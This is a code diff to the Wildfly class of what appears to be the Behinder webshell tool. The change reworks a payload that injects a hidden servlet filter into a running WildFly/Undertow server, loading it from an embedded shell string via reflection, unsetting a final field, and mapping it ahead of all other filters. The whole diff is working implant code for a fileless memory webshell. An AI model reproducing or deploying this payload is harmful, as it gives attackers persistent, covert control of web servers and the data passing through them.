@@ -1,15 +1,11 @@
 package net.rebeyond.behinder.payload.java.memoryshell;
 
-import io.undertow.servlet.api.DeploymentInfo;
-import io.undertow.servlet.api.FilterInfo;
-import io.undertow.servlet.core.DeploymentImpl;
-import io.undertow.servlet.util.ConstructorInstanceFactory;
-
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import javax.servlet.*;
 import javax.servlet.http.HttpSession;
 import javax.servlet.jsp.PageContext;
+import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.lang.reflect.Modifier;
@@ -46,29 +42,38 @@ public class Wildfly extends ClassLoader {
             Object context = servletContextF.get(obj);
             Field f = context.getClass().getDeclaredField("deploymentInfo");
             f.setAccessible(true);
-            DeploymentInfo deploymentInfo = (DeploymentInfo)f.get(context);
+            Object deploymentInfo = f.get(context);
 
             String filterName = "filter"+System.currentTimeMillis();
-            //只添加一次
-            Map<String, FilterInfo> filters = deploymentInfo.getFilters();
-            if(!filters.containsKey(filterName)){
-                System.out.println("[+] Add Dynamic Filter");
 
-                Class clazz = new Wildfly(this.getClass().getClassLoader()).g(shellString.getBytes(StandardCharsets.ISO_8859_1));
-                FilterInfo filter = new FilterInfo(filterName, clazz, new ConstructorInstanceFactory<Filter>(clazz.getDeclaredConstructor()));
-                deploymentInfo.addFilter(filter);
+//            Map<String, FilterInfo> filters = deploymentInfo.getFilters();
 
-                f = context.getClass().getDeclaredField("deployment");
-                f.setAccessible(true);
-                Field modifiersField = Field.class.getDeclaredField("modifiers");
-                modifiersField.setAccessible(true);
-                modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
-                DeploymentImpl deployment = (DeploymentImpl)f.get(context);
-                deployment.getFilters().addFilter(filter);
+            Class filterClazz = new Wildfly(this.getClass().getClassLoader()).g(shellString.getBytes(StandardCharsets.ISO_8859_1));
 
-                // 0 表示把我们动态注册的 filter 放在第一位
-                deploymentInfo.insertFilterUrlMapping(0, filterName, urlPattern, DispatcherType.REQUEST);
-            }
+            Constructor<?> constructor = Class.forName("io.undertow.servlet.api.FilterInfo").getConstructor(String.class, Class.class);
+            Object filter = constructor.newInstance(filterName, filterClazz);
+//            FilterInfo filter = new FilterInfo(filterName, filterClazz);
+
+            Class clazz = Class.forName("io.undertow.servlet.api.FilterInfo");
+
+            Method method = Class.forName("io.undertow.servlet.api.DeploymentInfo").getDeclaredMethod("addFilter", clazz);
+            method.invoke(deploymentInfo, filter);
+
+            f = context.getClass().getDeclaredField("deployment");
+            f.setAccessible(true);
+            Field modifiersField = Field.class.getDeclaredField("modifiers");
+            modifiersField.setAccessible(true);
+            modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
+            Object deployment = f.get(context);
+
+            object = Class.forName("io.undertow.servlet.core.DeploymentImpl").getMethod("getFilters").invoke(deployment);
+
+            Class.forName("io.undertow.servlet.core.ManagedFilters").getDeclaredMethod("addFilter", clazz).invoke(object, filter);
+//            deployment.getFilters().addFilter(filter);
+
+            // 0 表示把我们动态注册的 filter 放在第一位
+            method = Class.forName("io.undertow.servlet.api.DeploymentInfo").getDeclaredMethod("insertFilterUrlMapping", int.class, String.class, String.class, DispatcherType.class);
+            method.invoke(deploymentInfo, 0, filterName, urlPattern, DispatcherType.REQUEST);
 
             result.put("msg", "成功");
             result.put("status", "success");
